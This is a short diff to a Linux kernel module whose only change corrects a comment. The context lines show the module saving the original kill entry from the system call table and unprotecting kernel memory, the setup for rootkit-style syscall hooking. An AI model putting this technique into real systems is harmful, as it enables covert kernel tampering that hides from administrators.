@@ -38,7 +38,7 @@ static int __init lkm_init(void)
                 return -EINTR;
         }
 
-        original_kill = (void *) __sys_call_table[__NR_kill];                   //<- Save actual address for sys_shutdown
+        original_kill = (void *) __sys_call_table[__NR_kill];                   //<- Save actual address for sys_kill
 
         my_memory_rw();                                                         //<- Unprotect Memory
 
